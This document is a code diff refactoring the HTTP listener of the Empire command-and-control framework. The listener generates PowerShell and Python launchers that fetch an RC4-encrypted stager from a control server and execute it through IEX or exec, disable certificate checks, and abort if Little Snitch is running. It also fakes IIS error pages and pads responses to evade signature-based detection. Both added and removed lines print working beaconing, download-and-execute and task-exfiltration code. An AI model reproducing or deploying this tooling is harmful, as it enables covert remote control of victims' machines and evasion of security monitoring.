@@ -11,16 +11,17 @@ import string
 import sys
 import time
 from builtins import object, str
+from textwrap import dedent
 from typing import List
 
-from flask import Flask, make_response, request, send_from_directory
+from flask import Flask, make_response, render_template, request, send_from_directory
 from pydispatch import dispatcher
 from werkzeug.serving import WSGIRequestHandler
 
 from empire.server.common import encryption, helpers, packets, templating
 from empire.server.database import models
 from empire.server.database.base import Session
-from empire.server.utils import data_util
+from empire.server.utils import data_util, listener_util
 
 
 class Listener(object):
@@ -161,136 +162,17 @@ class Listener(object):
             data_util.get_config("staging_key")[0]
         )
 
-        # randomize the length of the default_response and index_page headers to evade signature based scans
-        self.header_offset = random.randint(0, 64)
-
         self.session_cookie = ""
 
         # check if the current session cookie not empty and then generate random cookie
         if self.session_cookie == "":
-            self.options["Cookie"]["Value"] = self.generate_cookie()
+            self.options["Cookie"]["Value"] = listener_util.generate_cookie()
 
     def default_response(self):
         """
         Returns an IIS 7.5 404 not found page.
         """
-
-        return "\r\n".join(
-            [
-                '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
-                '<html xmlns="http://www.w3.org/1999/xhtml">',
-                "<head>",
-                '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>',
-                "<title>404 - File or directory not found.</title>",
-                '<style type="text/css">',
-                "<!--",
-                "body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}",
-                "fieldset{padding:0 15px 10px 15px;} ",
-                "h1{font-size:2.4em;margin:0;color:#FFF;}",
-                "h2{font-size:1.7em;margin:0;color:#CC0000;} ",
-                "h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} ",
-                '#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;',
-                "background-color:#555555;}",
-                "#content{margin:0 0 0 2%;position:relative;}",
-                ".content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}",
-                "-->",
-                "</style>",
-                "</head>",
-                "<body>",
-                '<div id="header"><h1>Server Error</h1></div>',
-                '<div id="content">',
-                ' <div class="content-container"><fieldset>',
-                "  <h2>404 - File or directory not found.</h2>",
-                "  <h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3>",
-                " </fieldset></div>",
-                "</div>",
-                "</body>",
-                "</html>",
-                " "
-                * self.header_offset,  # randomize the length of the header to evade signature based detection
-            ]
-        )
-
-    def method_not_allowed_page(self):
-        """
-        Imitates IIS 7.5 405 "method not allowed" page.
-        """
-
-        return "\r\n".join(
-            [
-                '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
-                '<html xmlns="http://www.w3.org/1999/xhtml">',
-                "<head>",
-                '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>',
-                "<title>405 - HTTP verb used to access this page is not allowed.</title>",
-                '<style type="text/css">',
-                "<!--",
-                "body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}",
-                "fieldset{padding:0 15px 10px 15px;} ",
-                "h1{font-size:2.4em;margin:0;color:#FFF;}",
-                "h2{font-size:1.7em;margin:0;color:#CC0000;} ",
-                "h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} ",
-                '#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;',
-                "background-color:#555555;}",
-                "#content{margin:0 0 0 2%;position:relative;}",
-                ".content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}",
-                "-->",
-                "</style>",
-                "</head>",
-                "<body>",
-                '<div id="header"><h1>Server Error</h1></div>',
-                '<div id="content">',
-                ' <div class="content-container"><fieldset>',
-                "  <h2>405 - HTTP verb used to access this page is not allowed.</h2>",
-                "  <h3>The page you are looking for cannot be displayed because an invalid method (HTTP verb) was used to attempt access.</h3>",
-                " </fieldset></div>",
-                "</div>",
-                "</body>",
-                "</html>\r\n",
-            ]
-        )
-
-    def index_page(self):
-        """
-        Returns a default HTTP server page.
-        """
-
-        return "\r\n".join(
-            [
-                '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
-                '<html xmlns="http://www.w3.org/1999/xhtml">',
-                "<head>",
-                '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />',
-                "<title>IIS7</title>",
-                '<style type="text/css">',
-                "<!--",
-                "body {",
-                "	color:#000000;",
-                "	background-color:#B3B3B3;",
-                "	margin:0;",
-                "}",
-                "",
-                "#container {",
-                "	margin-left:auto;",
-                "	margin-right:auto;",
-                "	text-align:center;",
-                "	}",
-                "",
-                "a img {",
-                "	border:none;",
-                "}",
-                "",
-                "-->",
-                "</style>",
-                "</head>",
-                "<body>",
-                '<div id="container">',
-                '<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="welcome.png" alt="IIS7" width="571" height="411" /></a>',
-                "</div>",
-                "</body>",
-                "</html>",
-            ]
-        )
+        return open(f"{self.template_dir }/default.html", "r").read()
 
     def validate_options(self):
         """
@@ -364,7 +246,7 @@ class Listener(object):
             cookie = listenerOptions["Cookie"]["Value"]
             # generate new cookie if the current session cookie is empty to avoid empty cookie if create multiple listeners
             if cookie == "":
-                generate = self.generate_cookie()
+                generate = listener_util.generate_cookie()
                 listenerOptions["Cookie"]["Value"] = generate
                 cookie = generate
 
@@ -377,6 +259,7 @@ class Listener(object):
 
                 for bypass in bypasses:
                     stager += bypass
+
                 if safeChecks.lower() == "true":
                     stager += "};[System.Net.ServicePointManager]::Expect100Continue=0;"
 
@@ -384,7 +267,8 @@ class Listener(object):
                 if userAgent.lower() == "default":
                     profile = listenerOptions["DefaultProfile"]["Value"]
                     userAgent = profile.split("|")[1]
-                stager += "$u='" + userAgent + "';"
+                stager += f"$u='{ userAgent }';"
+
                 if "https" in host:
                     # allow for self-signed certificates for https connections
                     stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
@@ -398,7 +282,6 @@ class Listener(object):
                             stager += (
                                 "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                             )
-
                         else:
                             # TODO: implement form for other proxy
                             stager += f"$proxy=New-Object Net.WebProxy('{ proxy.lower() }');$wc.Proxy = $proxy;"
@@ -445,7 +328,7 @@ class Listener(object):
                 )
 
                 # this is the minimized RC4 stager code from rc4.ps1
-                stager += "$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};"
+                stager += listener_util.powershell_rc4()
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(
@@ -468,7 +351,10 @@ class Listener(object):
                         if headerKey.lower() == "host":
                             stager += "try{$ig=$wc.DownloadData($ser)}catch{};"
                         stager += (
-                            "$wc.Headers.Add(" + f"'{headerKey}','" + headerValue + "');"
+                            "$wc.Headers.Add("
+                            + f"'{headerKey}','"
+                            + headerValue
+                            + "');"
                         )
 
                 # add the RC4 packet to a cookie
@@ -478,6 +364,10 @@ class Listener(object):
 
                 # decode everything and kick it over to IEX to kick off execution
                 stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"
+
+                # Remove comments and make one line
+                stager = helpers.strip_powershell_comments(stager)
+                stager = data_util.ps_convert_to_oneliner(stager)
 
                 if obfuscate:
                     stager = data_util.obfuscate(
@@ -499,20 +389,16 @@ class Listener(object):
                 launcherBase = "import sys;"
                 if "https" in host:
                     # monkey patch ssl woohooo
-                    launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
+                    launcherBase += dedent(
+                        f"""
+                        import ssl;
+                        if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;
+                        """
+                    )
 
                 try:
                     if safeChecks.lower() == "true":
-                        launcherBase += "import re, subprocess;"
-                        launcherBase += (
-                            'cmd = "ps -ef | grep Little\ Snitch | grep -v grep"\n'
-                        )
-                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
-                        launcherBase += "out, err = ps.communicate()\n"
-                        launcherBase += (
-                            "if re.search(\"Little Snitch\", out.decode('UTF-8')):\n"
-                        )
-                        launcherBase += "   sys.exit()\n"
+                        launcherBase += listener_util.python_safe_checks()
                 except Exception as e:
                     p = "[!] Error setting LittleSnitch in stager: " + str(e)
                     print(helpers.color(p, color="red"))
@@ -521,9 +407,13 @@ class Listener(object):
                     profile = listenerOptions["DefaultProfile"]["Value"]
                     userAgent = profile.split("|")[1]
 
-                launcherBase += "import urllib.request;\n"
-                launcherBase += "UA='%s';" % (userAgent)
-                launcherBase += "server='%s';t='%s';" % (host, stage0)
+                launcherBase += dedent(
+                    f"""
+                    import urllib.request;
+                    UA='{ userAgent }';server='{ host }';t='{ stage0 }';
+                    req=urllib.request.Request(server+t);
+                    """
+                )
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(
@@ -537,17 +427,13 @@ class Listener(object):
 
                 b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")
 
-                launcherBase += "req=urllib.request.Request(server+t);\n"
-
                 # Add custom headers if any
                 if customHeaders != []:
                     for header in customHeaders:
                         headerKey = header.split(":")[0]
                         headerValue = header.split(":")[1]
-                        # launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
-                        launcherBase += 'req.add_header("%s","%s");\n' % (
-                            headerKey,
-                            headerValue,
+                        launcherBase += (
+                            f'req.add_header("{ headerKey }","{ headerValue }");\n'
                         )
 
                 if proxy.lower() != "none":
@@ -555,43 +441,26 @@ class Listener(object):
                         launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                     else:
                         proto = proxy.split(":")[0]
-                        launcherBase += (
-                            "proxy = urllib.request.ProxyHandler({'"
-                            + proto
-                            + "':'"
-                            + proxy
-                            + "'});\n"
-                        )
+                        launcherBase += f"proxy = urllib.request.ProxyHandler({{'{ proto }':'{ proxy }'}});\n"
 
                     if proxyCreds != "none":
                         if proxyCreds == "default":
                             launcherBase += "o = urllib.request.build_opener(proxy);\n"
 
                             # add the RC4 packet to a cookie
-                            launcherBase += (
-                                'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session=%s")];\n'
-                                % (b64RoutingPacket)
-                            )
+                            launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session={ b64RoutingPacket }")];\n'
                         else:
-                            launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
                             username = proxyCreds.split(":")[0]
                             password = proxyCreds.split(":")[1]
-                            launcherBase += (
-                                "proxy_auth_handler.add_password(None,'"
-                                + proxy
-                                + "','"
-                                + username
-                                + "','"
-                                + password
-                                + "');\n"
+                            launcherBase += dedent(
+                                f"""
+                                proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();
+                                proxy_auth_handler.add_password(None,'{ proxy }','{ username }','{ password }');
+                                o = urllib.request.build_opener(proxy, proxy_auth_handler);
+                                o.addheaders=[('User-Agent',UA), ("Cookie", "session={ b64RoutingPacket }")];
+                                """
                             )
-                            launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler);\n"
 
-                            # add the RC4 packet to a cookie
-                            launcherBase += (
-                                'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session=%s")];\n'
-                                % (b64RoutingPacket)
-                            )
                     else:
                         launcherBase += "o = urllib.request.build_opener(proxy);\n"
                 else:
@@ -599,26 +468,10 @@ class Listener(object):
 
                 # install proxy and creds globally, so they can be used with urlopen.
                 launcherBase += "urllib.request.install_opener(o);\n"
+                launcherBase += "a=urllib.request.urlopen(req).read();\n"
 
                 # download the stager and extract the IV
-
-                launcherBase += "a=urllib.request.urlopen(req).read();\n"
-                launcherBase += "IV=a[0:4];"
-                launcherBase += "data=a[4:];"
-                launcherBase += "key=IV+'%s'.encode('UTF-8');" % (staging_key)
-
-                # RC4 decryption
-                launcherBase += "S,j,out=list(range(256)),0,[]\n"
-                launcherBase += "for i in list(range(256)):\n"
-                launcherBase += "    j=(j+S[i]+key[i%len(key)])%256\n"
-                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
-                launcherBase += "i=j=0\n"
-                launcherBase += "for char in data:\n"
-                launcherBase += "    i=(i+1)%256\n"
-                launcherBase += "    j=(j+S[i])%256\n"
-                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
-                launcherBase += "    out.append(chr(char^S[(S[i]+S[j])%256]))\n"
-                launcherBase += "exec(''.join(out))"
+                launcherBase += listener_util.python_extract_stager(staging_key)
 
                 if encode:
                     launchEncoded = base64.b64encode(
@@ -626,10 +479,7 @@ class Listener(object):
                     ).decode("UTF-8")
                     if isinstance(launchEncoded, bytes):
                         launchEncoded = launchEncoded.decode("UTF-8")
-                    launcher = (
-                        "echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('%s'));\" | python3 &"
-                        % (launchEncoded)
-                    )
+                    launcher = f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{ launchEncoded }'));\" | python3 &"
                     return launcher
                 else:
                     return launcherBase
@@ -737,10 +587,10 @@ class Listener(object):
                         continue
                     remove += value
                 headers = ",".join(remove)
-                # headers = ','.join(customHeaders)
                 stager = stager.replace(
-                    '$customHeaders = "";', '$customHeaders = "' + headers + '";'
+                    '$customHeaders = "";', f'$customHeaders = "{ headers }";'
                 )
+
             # patch in working hours, if any
             if workingHours != "":
                 stager = stager.replace("WORKING_HOURS_REPLACE", workingHours)
@@ -871,23 +721,21 @@ class Listener(object):
             code = helpers.strip_powershell_comments(code)
 
             # patch in the delay, jitter, lost limit, and comms profile
-            code = code.replace("$AgentDelay = 60", "$AgentDelay = " + str(delay))
-            code = code.replace("$AgentJitter = 0", "$AgentJitter = " + str(jitter))
+            code = code.replace("$AgentDelay = 60", f"$AgentDelay = { delay }")
+            code = code.replace("$AgentJitter = 0", f"$AgentJitter = { jitter}")
             code = code.replace(
                 '$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
-                '$Profile = "' + str(profile) + '"',
+                f'$Profile = "{ profile }"',
             )
-            code = code.replace("$LostLimit = 60", "$LostLimit = " + str(lostLimit))
+            code = code.replace("$LostLimit = 60", f"$LostLimit = { lostLimit }")
             code = code.replace(
                 '$DefaultResponse = ""',
-                '$DefaultResponse = "' + b64DefaultResponse.decode("UTF-8") + '"',
+                f'$DefaultResponse = "{ b64DefaultResponse.decode("UTF-8") }"',
             )
 
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
-                code = code.replace(
-                    "$KillDate,", "$KillDate = '" + str(killDate) + "',"
-                )
+                code = code.replace("$KillDate,", f"$KillDate = '{ killDate }',")
             if obfuscate:
                 code = data_util.obfuscate(
                     self.mainMenu.installPath,
@@ -914,25 +762,27 @@ class Listener(object):
             code = helpers.strip_python_comments(code)
 
             # patch in the delay, jitter, lost limit, and comms profile
-            code = code.replace("delay = 60", "delay = %s" % (delay))
-            code = code.replace("jitter = 0.0", "jitter = %s" % (jitter))
+            code = code.replace("delay = 60", f"delay = { delay }")
+            code = code.replace("jitter = 0.0", f"jitter = { jitter }")
             code = code.replace(
                 'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
-                'profile = "%s"' % (profile),
+                f'profile = "{ profile }"',
             )
-            code = code.replace("lostLimit = 60", "lostLimit = %s" % (lostLimit))
+            code = code.replace("lostLimit = 60", f"lostLimit = { lostLimit }")
             code = code.replace(
                 'defaultResponse = base64.b64decode("")',
-                'defaultResponse = base64.b64decode("%s")'
-                % (b64DefaultResponse.decode("UTF-8")),
+                f'defaultResponse = base64.b64decode("{ b64DefaultResponse.decode("UTF-8") }")',
             )
 
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
-                code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
+                code = code.replace(
+                    'killDate = "REPLACE_KILLDATE"', f'killDate = "{ killDate }"'
+                )
             if workingHours != "":
                 code = code.replace(
-                    'workingHours = ""', 'workingHours = "%s"' % (killDate)
+                    'workingHours = "REPLACE_WORKINGHOURS"',
+                    f'workingHours = "{ killDate }"',
                 )
 
             return code
@@ -957,138 +807,21 @@ class Listener(object):
         if language:
             if language.lower() == "powershell":
 
-                updateServers = """
-                    $Script:ControlServers = @("%s");
-                    $Script:ServerIndex = 0;
-                """ % (
-                    listenerOptions["Host"]["Value"]
-                )
+                updateServers = f"""
+                    $Script:ControlServers = @("{ listenerOptions["Host"]["Value"] }");
+                    $Script:ServerIndex = 0;\n
+                """
 
                 if listenerOptions["Host"]["Value"].startswith("https"):
-                    updateServers += "\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
+                    updateServers += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
-                getTask = (
-                    """
-                    $script:GetTask = {
-
-                        try {
-                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {
-
-                                # meta 'TASKING_REQUEST' : 4
-                                $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
-                                $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
-
-                                # build the web request object
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """ = New-Object System.Net.WebClient
-
-                                # set the proxy settings for the WC to be the default system settings
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                                if($Script:Proxy) {
-                                    $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy = $Script:Proxy;
-                                }
-
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add("User-Agent",$script:UserAgent)
-                                $script:Headers.GetEnumerator() | % {$"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add($_.Name, $_.Value)}
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add("Cookie",\""""
-                    + self.session_cookie
-                    + """session=$RoutingCookie")
-
-                                # choose a random valid URI for checkin
-                                $taskURI = $script:TaskURIs | Get-Random
-                                $result = $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
-                                $result
-                            }
-                        }
-                        catch [Net.WebException] {
-                            $script:MissedCheckins += 1
-                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
-                                # restart key negotiation
-                                Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                            }
-                        }
-                    }
-                """
-                )
-
-                sendMessage = (
-                    """
-                    $script:SendMessage = {
-                        param($Packets)
-
-                        if($Packets) {
-                            # build and encrypt the response packet
-                            $EncBytes = Encrypt-Bytes $Packets
-
-                            # build the top level RC4 "routing packet"
-                            # meta 'RESULT_POST' : 5
-                            $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5
-
-                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
-                                # build the web request object
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """ = New-Object System.Net.WebClient
-                                # set the proxy settings for the WC to be the default system settings
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                                if($Script:Proxy) {
-                                    $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy = $Script:Proxy;
-                                }
-
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add('User-Agent', $Script:UserAgent)
-                                $Script:Headers.GetEnumerator() | ForEach-Object {$"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add($_.Name, $_.Value)}
-
-                                try {
-                                    # get a random posting URI
-                                    $taskURI = $Script:TaskURIs | Get-Random
-                                    $response = $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
-                                }
-                                catch [System.Net.WebException]{
-                                    # exception posting data...
-                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
-                                        # restart key negotiation
-                                        Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                                    }
-                                }
-                            }
-                        }
-                    }
-                """
-                )
+                getTask = listener_util.powershell_get_task(self.session_cookie)
+                sendMessage = listener_util.powershell_send_message()
 
                 return updateServers + getTask + sendMessage
 
             elif language.lower() == "python":
-                updateServers = "server = '%s'\n" % (listenerOptions["Host"]["Value"])
+                updateServers = f"server = '{listenerOptions['Host']['Value']}'\n"
 
                 if listenerOptions["Host"]["Value"].startswith("https"):
                     updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"
@@ -1101,59 +834,7 @@ class Listener(object):
                 socks_import = f.read()
                 f.close()
 
-                sendMessage = f"""
-def update_proxychain(proxy_list):
-    setdefaultproxy()  # Clear the default chain
-
-    for proxy in proxy_list:
-        addproxy(proxytype=proxy['proxytype'], addr=proxy['addr'], port=proxy['port'])
-
-def send_message(packets=None):
-    # Requests a tasking or posts data to a randomized tasking URI.
-    # If packets == None, the agent GETs a tasking from the control server.
-    # If packets != None, the agent encrypts the passed packets and
-    #    POSTs the data to the control server.
-    global missedCheckins
-    global server
-    global headers
-    global taskURIs
-    data = None
-    if packets:
-        # aes_encrypt_then_hmac is in stager.py
-        encData = aes_encrypt_then_hmac(key, packets)
-        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
-
-    else:
-        # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
-        #   meta TASKING_REQUEST = 4
-        routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
-        b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
-        headers['Cookie'] = "{self.session_cookie}session=%s" % (b64routingPacket)
-    taskURI = random.sample(taskURIs, 1)[0]
-    requestUri = server + taskURI
-
-    try:
-        wrapmodule(urllib.request)
-        data = (urllib.request.urlopen(urllib.request.Request(requestUri, data, headers))).read()
-        return ('200', data)
-
-    except urllib.request.HTTPError as HTTPError:
-        # if the server is reached, but returns an error (like 404)
-        missedCheckins = missedCheckins + 1
-        #if signaled for restaging, exit.
-        if HTTPError.code == 401:
-            sys.exit(0)
-
-        return (HTTPError.code, '')
-
-    except urllib.request.URLError as URLerror:
-        # if the server cannot be reached
-        missedCheckins = missedCheckins + 1
-        return (URLerror.reason, '')
-    return ('', '')
-
-
-"""
+                sendMessage = listener_util.python_send_message(self.session_cookie)
                 return socks_import + updateServers + sendMessage
 
             else:
@@ -1191,7 +872,8 @@ def send_message(packets=None):
         proxy = self.options["Proxy"]["Value"]
         proxyCreds = self.options["ProxyCreds"]["Value"]
 
-        app = Flask(__name__)
+        self.template_dir = self.mainMenu.installPath + "/data/listeners/templates/"
+        app = Flask(__name__, template_folder=self.template_dir)
         self.app = app
 
         # Set HTTP/1.1 as in IIS 7.5 instead of /1.0
@@ -1238,7 +920,9 @@ def send_message(packets=None):
 
         @app.after_request
         def change_header(response):
-            "Modify the headers response server."
+            """
+            Modify the headers response server.
+            """
             headers = listenerOptions["Headers"]["Value"]
             for key in headers.split("|"):
                 value = key.split(":")
@@ -1247,7 +931,9 @@ def send_message(packets=None):
 
         @app.after_request
         def add_proxy_headers(response):
-            "Add HTTP headers to avoid proxy caching."
+            """
+            Add HTTP headers to avoid proxy caching.
+            """
             response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
             response.headers["Pragma"] = "no-cache"
             response.headers["Expires"] = "0"
@@ -1258,7 +944,7 @@ def send_message(packets=None):
             """
             Returns IIS 7.5 405 page for every Flask 405 error.
             """
-            return make_response(self.method_not_allowed_page(), 405)
+            return render_template("method_not_allowed.html"), 405
 
         @app.route("/")
         @app.route("/iisstart.htm")
@@ -1266,15 +952,12 @@ def send_message(packets=None):
             """
             Return default server web page if user navigates to index.
             """
-
-            static_dir = self.mainMenu.installPath + "/data/misc/"
-            return make_response(self.index_page(), 200)
+            return render_template("index.html"), 200
 
         @app.route("/<path:request_uri>", methods=["GET"])
         def handle_get(request_uri):
             """
             Handle an agent GET request.
-
             This is used during the first step of the staging process,
             and when the agent requests taskings.
             """
@@ -1611,13 +1294,3 @@ def send_message(packets=None):
                 )
             )
             self.threads[self.options["Name"]["Value"]].kill()
-
-    def generate_cookie(self):
-        """
-        Generate Cookie
-        """
-
-        chars = string.ascii_letters
-        cookie = helpers.random_string(random.randint(6, 16), charset=chars)
-
-        return cookie
